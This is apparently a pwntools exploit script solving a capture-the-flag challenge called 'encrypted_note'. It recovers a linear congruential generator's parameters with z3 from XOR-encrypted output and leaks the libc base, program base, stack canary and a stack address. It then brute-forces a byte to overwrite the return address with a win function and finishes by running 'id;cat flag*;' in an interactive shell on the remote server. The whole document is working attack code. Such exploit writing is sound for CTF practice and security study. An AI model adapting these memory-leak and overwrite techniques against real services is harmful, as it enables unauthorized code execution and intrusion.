#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from z3 import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'


exe = ELF('./encrypted_note')
libc = ELF('./libc.so.6')

host, port = "pwn-2021.duc.tf","31908"

def writen(data):
  p.sendlineafter('> ', '1')
  p.sendafter('contents: ', data)

def readn():
  p.sendlineafter('> ', '2')

def addn(data):
  p.sendlineafter('> ', '3')
  p.sendafter('append: ', data)


while(True):
  try:
    if args.LOCAL:
      p = process(exe.path)
    else:
      p = remote(host,port)

    p.sendlineafter('> ', '2')
    res = p.recvuntil('\n',drop=True)
    print(res)
    if (len(res)!=12):
      p.close
      continue
    buff = res[10:12]+res[8:10]+res[6:8]+res[4:6]+res[2:4]+res[0:2]

    s = Solver()
    A = BitVec('A',64)
    B = BitVec('B',64)
    X = BitVec('X',64)

    leak = int(buff,16)
    print('leak = '+hex(leak))
    libc.address = leak - 0x1e24a0
    print('libc base = '+hex(libc.address))

    #----------------------------------------------------
    second = (libc.address+0x8a6ad) & 0xffffffffff
    dest = b'\x01\x01'+p64(second)[0:6]
    print(hexdump(dest))
    addn(dest)

    readn()
    p.recv(12)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ u64(dest)
    expre = 's.add((X * A) + B == '+str(num)+')'
    print(expre)
    eval(expre)
    prev = num

    #-----------------------------------------------------------------
    dest =  b'\x01'*7+b'\x00'
    addn(dest)
    readn()
    p.recv(28)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ u64(dest)
    expre = 's.add(('+str(prev)+' * A) + B == '+str(num)+')'
    print(expre)
    eval(expre)
    prev = num

    #-------------------------------------------------------------------
    third = (libc.address+0x81375) & 0xffffffffff
    dest = b'\x01\x01'+p64(third)[0:6]
    print(hexdump(dest))
    addn(dest)

    readn()
    p.recv(44)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ u64(dest)
    expre = 's.add(('+str(prev)+' * A) + B == '+str(num)+')'
    print(expre)
    eval(expre)
    prev = num

    print(s.check())
    print(s.model())

    m = s.model()
    A = m[A].as_long()
    B = m[B].as_long()
    X = m[X].as_long()

    def next(prev_X):
      global A
      global B
      result = (((prev_X * A)+B) & 0xffffffffffffffff)
      return result

    print('A = '+str(A))
    print('B = '+str(B))
    print('X = '+str(X))

    dest = next(prev)

    print('1 dest = '+hex(dest))
    addn('\x01\x01')
    readn()
    p.recv(60)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ 0x0101
    prev = num

    #------------------------
    dest = next(prev)
    print('2 dest = '+hex(dest))

    addn('\x01'*8)
    readn()
    p.recv(76)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ 0x01010101010101
    prev = num
    #------------------------
    dest = next(prev)
    print('3 dest = '+hex(dest))

    addn('\x01'*8)
    readn()
    p.recv(92)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ 0x01010101010101
    prev = num

    #--------------------------------
    dest = next(prev)
    print('4 dest = '+hex(dest))

    addn('\x01'*8)
    readn()
    p.recv(108)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ 0x01010101010101
    prev = num

    #--------------------------------
    dest = next(prev)
    print('5 dest = '+hex(dest))
    addn(b'\x01'*2+p64(dest)[2:8])
    readn()
    p.recv(124)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ u64(b'\x01'*2+p64(dest)[2:7]+b'\x00')
    prev = num
    #--------------------------------
    dest = next(prev)
    print('6 dest = '+hex(dest))

    addn('\x01'*8)
    readn()
    p.recv(128)
    buff = b''
    inp = ''
    while True:
      inp = p.recv(1)
      if (inp == b'\n'):
        break
      inp += p.recv(1)
      buff = inp + buff

    num = int(buff,16)
    num = num ^ 0x01010101010101
    prev = num

    readn()

    # receive prog leak
    buff = p.recvuntil('\n', drop=True)
    pos = len(buff)
    val = b''
    for i in range(6):
      val += buff[pos-((i+1)*2):pos-(i*2)]

    leak_prog = int(val,16)
    print('leak prog = '+hex(leak_prog))
    if ((leak_prog & 0xff) != 0xa4):
      p.close
      continue
    progbase = leak_prog - 0x12a4
    print('prog base = '+hex(progbase))

    #>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    payload = b''
    for i in range(11):
      val = next(prev)
      prev = val
      if i == 10:
        payload += p64(val ^ 0x0000000000000001)
      else:
        payload += p64(val ^ 0x0101010101010101)

    writen(payload)

    print('did it works...?')
    readn()
    res = p.recvuntil('\n')
    if (b'010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101' in res):
      print(res)
      break
    else:
      p.close()
      continue
  except:
    p.close
    continue

val = next(prev)
prev = val

addn(p64(val ^ 0x01ff010101010101))
readn()

# receive canary leak
p.recvuntil('01'*81, drop=True)
buff = p.recv(16)
buff = b''
inp = ''
for i in range(7):
  inp = p.recv(2)
  buff = inp + buff

canary = (int(buff,16)<<8)
print('canary = '+hex(canary))

# receive stack leak
buff = b''
inp = ''
for i in range(6):
  inp = p.recv(2)
  buff = inp + buff

stack = int(buff,16)
print('stack = '+hex(stack))

val = next(prev)
prev = val

context.log_level = 'debug'

print('val = '+hex(val))

win = progbase + 0x15d8

dest = 0x00d80101 ^ val
addn(p64(dest))

val = next(prev)
prev = val

dest = ((progbase + 0x15d8)>>8) ^ val
addn(p64(dest))

context.log_level = 'error'

def check12(prevv):
  for u in range(12):
    vi = next(prevv)
    prevv = vi
  return ((vi>>56)&0xff)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
print('Bruteforcing last byte...')
count = 0
while (True):
  print(str(count))
  payload = b''
  val = next(prev)
  prev = val
  payload += p64(val ^ 0x00ffffffffffffff)
  writen(payload)

  if (check12(prev) == 0):
    break
  count +=1

print('found it...')


payload = b''
for i in range(11):
  val = next(prev)
  prev = val
  if i == 10:
    payload += p64(val ^ 0x00000000000000ff)
  else:
    payload += p64(val ^ 0xffffffffffffffff)

writen(payload)

val = next(prev)
print('val last = '+hex(val))
prev = val

addn(p64(val ^ 0x00ffffffffffffff))

p.sendlineafter('> ', '0')

p.sendline('id;cat flag*;')
p.interactive()

